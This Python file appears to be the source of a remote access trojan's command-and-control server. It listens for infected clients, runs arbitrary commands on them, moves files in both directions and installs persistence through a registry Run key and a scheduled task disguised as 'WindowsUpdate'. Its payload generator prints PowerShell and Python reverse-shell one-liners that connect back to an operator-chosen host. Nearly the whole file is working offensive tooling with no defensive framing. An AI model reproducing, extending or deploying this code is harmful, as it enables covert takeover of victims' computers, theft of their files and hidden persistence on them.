import socket
import threading
import os
import json
import base64
import time
from datetime import datetime
import subprocess
import shutil

# Configuration
CONFIG = {
    "HOST": "0.0.0.0",
    "PORT": 4444,
    "LOG_FILE": "c2_log.txt",
    "DOWNLOAD_DIR": "downloads",
    "UPLOAD_DIR": "uploads",
    "PERSISTENCE_METHODS": {
        "registry": "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"{path}\"",
        "scheduled_task": "schtasks /create /tn \"WindowsUpdate\" /tr \"{path}\" /sc onlogon /F"
    }
}

clients = {}
session_data = {}

# Feature Modules
class RATFeatures:
    @staticmethod
    def execute_command(cmd):
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('utf-8', errors='replace')
        except Exception as e:
            return str(e)

    @staticmethod
    def upload_file(file_path, content):
        os.makedirs(CONFIG['UPLOAD_DIR'], exist_ok=True)
        with open(os.path.join(CONFIG['UPLOAD_DIR'], file_path), 'wb') as f:
            f.write(base64.b64decode(content))
        return f"File uploaded to {CONFIG['UPLOAD_DIR']}/{file_path}"

    @staticmethod
    def download_file(file_path):
        try:
            with open(file_path, 'rb') as f:
                return base64.b64encode(f.read()).decode('utf-8')
        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    def persist(agent_path, method):
        persistence_cmd = CONFIG['PERSISTENCE_METHODS'][method].format(path=agent_path)
        return RATFeatures.execute_command(persistence_cmd)

# Server Core
def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(CONFIG["LOG_FILE"], "a") as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"[{timestamp}] {message}")

def handle_client(client_socket, addr):
    log_message(f"New connection from {addr}")
    clients[addr] = client_socket
    session_data[addr] = {"current_dir": "C:\\"}
    
    try:
        while True:
            data = client_socket.recv(1024*1024).decode('utf-8')  # 1MB buffer
            if not data:
                break
                
            try:
                cmd_data = json.loads(data)
                response = process_command(addr, cmd_data)
                client_socket.send(response.encode('utf-8'))
            except json.JSONDecodeError:
                log_message(f"Invalid data from {addr}")
                
    except Exception as e:
        log_message(f"Error with {addr}: {str(e)}")
    finally:
        client_socket.close()
        del clients[addr]
        del session_data[addr]
        log_message(f"Client {addr} disconnected")

def process_command(addr, cmd_data):
    cmd_type = cmd_data.get("type")
    result = ""
    
    if cmd_type == "cmd":
        result = RATFeatures.execute_command(cmd_data["command"])
    elif cmd_type == "upload":
        result = RATFeatures.upload_file(cmd_data["file_name"], cmd_data["content"])
    elif cmd_type == "download":
        result = RATFeatures.download_file(cmd_data["file_path"])
    elif cmd_type == "persist":
        result = RATFeatures.persist(cmd_data["agent_path"], cmd_data["method"])
    elif cmd_type == "cd":
        try:
            os.chdir(cmd_data["path"])
            session_data[addr]["current_dir"] = os.getcwd()
            result = f"Changed directory to {session_data[addr]['current_dir']}"
        except Exception as e:
            result = str(e)
    else:
        result = "Unknown command type"
    
    return json.dumps({
        "result": result,
        "current_dir": session_data[addr].get("current_dir", "")
    })

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((CONFIG["HOST"], CONFIG["PORT"]))
    server.listen(5)
    log_message(f"C2 server started on {CONFIG['HOST']}:{CONFIG['PORT']}")

    try:
        while True:
            client_socket, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, addr)).start()
    except KeyboardInterrupt:
        log_message("Server stopped by user")
    finally:
        server.close()

# Client Interaction Menu
def show_main_menu():
    print("\n=== Advanced RAT Menu ===")
    print("1. List connected clients")
    print("2. Interact with client")
    print("3. Start listener")
    print("4. Generate payload")
    print("5. Exit")
    return input("> ")

def show_client_menu(addr):
    print(f"\n=== Client {addr} ===")
    print("1. Execute command")
    print("2. File operations")
    print("3. System operations")
    print("4. Persistence")
    print("5. Screenshot")
    print("6. Keylogger")
    print("7. Return to main")
    return input("> ")

def file_operations_menu(addr):
    print("\n=== File Operations ===")
    print("1. Download file")
    print("2. Upload file")
    print("3. List directory")
    print("4. Return")
    choice = input("> ")
    
    if choice == "1":
        file_path = input("Remote file path: ")
        cmd = json.dumps({"type": "download", "file_path": file_path})
        clients[addr].send(cmd.encode('utf-8'))
        response = json.loads(clients[addr].recv(1024*1024).decode('utf-8'))
        if not response["result"].startswith("Error:"):
            os.makedirs(CONFIG['DOWNLOAD_DIR'], exist_ok=True)
            with open(os.path.join(CONFIG['DOWNLOAD_DIR'], os.path.basename(file_path)), 'wb') as f:
                f.write(base64.b64decode(response["result"]))
            print(f"File downloaded to {CONFIG['DOWNLOAD_DIR']}")
        else:
            print(response["result"])
            
    elif choice == "2":
        file_path = input("Local file path: ")
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            remote_path = input("Remote save path: ")
            cmd = json.dumps({
                "type": "upload",
                "file_name": remote_path,
                "content": content
            })
            clients[addr].send(cmd.encode('utf-8'))
            print(json.loads(clients[addr].recv(1024).decode('utf-8'))["result"])
        else:
            print("File not found")
            
    elif choice == "3":
        path = input("Directory path (leave empty for current): ")
        cmd = json.dumps({
            "type": "cmd",
            "command": f"dir \"{path}\"" if path else "dir"
        })
        clients[addr].send(cmd.encode('utf-8'))
        print(json.loads(clients[addr].recv(1024*1024).decode('utf-8'))["result"])

def interact_with_client(addr):
    while True:
        choice = show_client_menu(addr)
        
        if choice == "1":
            cmd = input(f"Command ({addr}): ")
            clients[addr].send(json.dumps({
                "type": "cmd",
                "command": cmd
            }).encode('utf-8'))
            print(json.loads(clients[addr].recv(1024*1024).decode('utf-8'))["result"])
            
        elif choice == "2":
            file_operations_menu(addr)
            
        elif choice == "3":
            print("\n=== System Operations ===")
            print("1. Get system info")
            print("2. List processes")
            print("3. Kill process")
            print("4. Get network info")
            sub_choice = input("> ")
            
            if sub_choice == "1":
                clients[addr].send(json.dumps({"type": "cmd", "command": "systeminfo"}).encode('utf-8'))
            elif sub_choice == "2":
                clients[addr].send(json.dumps({"type": "cmd", "command": "tasklist"}).encode('utf-8'))
            elif sub_choice == "3":
                pid = input("Process ID to kill: ")
                clients[addr].send(json.dumps({"type": "cmd", "command": f"taskkill /PID {pid} /F"}).encode('utf-8'))
            elif sub_choice == "4":
                clients[addr].send(json.dumps({"type": "cmd", "command": "ipconfig /all"}).encode('utf-8'))
                
            print(json.loads(clients[addr].recv(1024*1024).decode('utf-8'))["result"])
            
        elif choice == "4":
            print("\n=== Persistence ===")
            print("1. Registry (Run key)")
            print("2. Scheduled Task")
            method = input("Method (1/2): ")
            agent_path = input("Agent path on target: ")
            
            method_name = "registry" if method == "1" else "scheduled_task"
            clients[addr].send(json.dumps({
                "type": "persist",
                "agent_path": agent_path,
                "method": method_name
            }).encode('utf-8'))
            print(json.loads(clients[addr].recv(1024).decode('utf-8'))["result"])
            
        elif choice == "5":
            print("Screenshot functionality would be implemented here")
            
        elif choice == "6":
            print("Keylogger functionality would be implemented here")
            
        elif choice == "7":
            break

def generate_payload():
    print("\n=== Payload Generator ===")
    lhost = input("C2 Server IP: ")
    lport = input("C2 Server Port: ")
    payload_type = input("Payload type (1. PowerShell / 2. Python): ")
    
    if payload_type == "1":
        payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        print("\nPowerShell payload:\n")
        print(payload)
    elif payload_type == "2":
        payload = f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"""
        print("\nPython payload:\n")
        print(payload)
    
    save = input("\nSave to file? (y/n): ")
    if save.lower() == 'y':
        filename = input("Filename: ")
        with open(filename, 'w') as f:
            f.write(payload)
        print(f"Payload saved to {filename}")

def main():
    # Create necessary directories
    os.makedirs(CONFIG['DOWNLOAD_DIR'], exist_ok=True)
    os.makedirs(CONFIG['UPLOAD_DIR'], exist_ok=True)
    
    # Start server thread if not already running
    if not any(t.name == "server_thread" for t in threading.enumerate()):
        server_thread = threading.Thread(target=start_server, name="server_thread")
        server_thread.daemon = True
        server_thread.start()
    
    while True:
        choice = show_main_menu()
        
        if choice == "1":
            print("\nConnected clients:")
            for i, addr in enumerate(clients):
                print(f"{i+1}. {addr}")
                
        elif choice == "2":
            if not clients:
                print("No clients connected!")
                continue
            print("\nConnected clients:")
            for i, addr in enumerate(clients):
                print(f"{i+1}. {addr}")
            try:
                client_num = int(input("Select client: ")) - 1
                addr = list(clients.keys())[client_num]
                interact_with_client(addr)
            except (ValueError, IndexError):
                print("Invalid selection!")
                
        elif choice == "3":
            if any(t.name == "server_thread" for t in threading.enumerate()):
                print("Server is already running!")
            else:
                server_thread = threading.Thread(target=start_server, name="server_thread")
                server_thread.daemon = True
                server_thread.start()
                print("Server started in background")
                
        elif choice == "4":
            generate_payload()
            
        elif choice == "5":
            print("Exiting...")
            break

if __name__ == "__main__":
    main()